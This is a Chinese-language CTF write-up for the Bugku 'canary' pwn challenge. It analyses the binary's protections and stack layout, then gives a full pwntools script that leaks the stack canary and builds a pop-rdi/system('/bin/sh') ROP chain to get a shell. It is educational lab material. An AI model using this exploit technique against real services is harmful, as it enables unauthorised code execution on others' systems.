---
title: '[Bugku]canary'
date: '2022-02-06 15:51:16'
draft: false
categories: ['CTF']
tags: ['Bugku', 'Canary', 'CTF', 'Easy', 'Pwn', 'Writeup']
description: "Bugku canary 练习记录，通过程序反汇编与栈布局分析理解 Canary 保护及题目中的绕过思路。"
---

## 查看程序保护机制

![image-20220218164122140](https://image.txgde.space/2022/02/image-20220218164122140.png)

发现打开了NX、Canary,结合本题题目可知本题主要是进行canary绕过

## 分析程序流程

### 首先运行一下程序

输入`chmod +x pwn4`赋予pwn4执行的权限,然后`./pwn4`运行:

提示输入名字(36个字符以内),继续

提示输入一段message,继续

![image-20220218164839317](https://image.txgde.space/2022/02/image-20220218164839317.png)

程序结束

### 反汇编

接下来使用`objdump -d pwn4`命令进行反汇编,寻找段名找有意义的函数,找到了main函数和一个hint函数(提示函数?)

#### main函数

观察main函数发现canary保护

![image-20220218171700158](https://image.txgde.space/2022/02/image-20220218171700158.png)

main函数的栈帧如下

![image-20220218172405955](https://image.txgde.space/2022/02/image-20220218172405955.png)

输入的name一共占用0x240-0x210共48个字节,message占用0x240-0x8共520个字节,canary占用8个字节,两次输入均可输入0x300(768)个字节

#### hint函数

![image-20220218172709308](https://image.txgde.space/2022/02/image-20220218172709308.png)

hint函数调用了system函数,gdb调试看看hint中的system执行了什么命令

![image-20220218172906933](https://image.txgde.space/2022/02/image-20220218172906933.png)

hint函数执行了`echo sixsixsix`命令`x/s`命令表示以字符串的形式查看内存

## pwn思路

程序共有两次输入,且都允许输入0x300(768)个字节,可以利用第一次输入泄漏出来canary的值

然后构造payload利用第二次输入覆盖掉address获取shell.

现在还有一个问题就是hint函数虽然调用了system但是并没有进行输出flag到操作或者让我们拿到shell,因为程序开启了NX保护,因此没办法在输入变量时构造shellcode,我们查一下看看程序有没有`/bin/sh`的字串.

通过`strings pwn4`命令发现目标

![image-20220218174531839](https://image.txgde.space/2022/02/image-20220218174531839.png)

接下来使用gef的`search-pattern /bin/sh`命令来查找`/bin/sh`的地址

![image-20220218175008668](https://image.txgde.space/2022/02/image-20220218175008668.png)

在pwn4文件的0x601068发现了该字符串

然后通过将该字符串作为参数传到system函数中即可获取shell

传参可以使用rdi寄存器,我们通过gef的`ropper --search 'pop rdi'`命令搜索一下程序中有没有`pop rdi`的命令:

![image-20220218180221472](https://image.txgde.space/2022/02/image-20220218180221472.png)

在0x400963处发现`pop rdi`命令

## payload

python代码如下:

``` python
from pwn import *

f = process('./pwn4')
#f=remote('')

f.send(b'a'*568+b'b')
f.recvuntil(b'aaab')
canary = f.recv(7)
canary = b'\0'+canary

sh_address = 0x601068
system_address  = 0x40080c
poprdi_address = 0x400963

payload = b'a'*520 + canary + p64(0) + p64(poprdi_address) + p64(sh_address) + p64(system_address)

f.send(payload)
f.interactive()
```
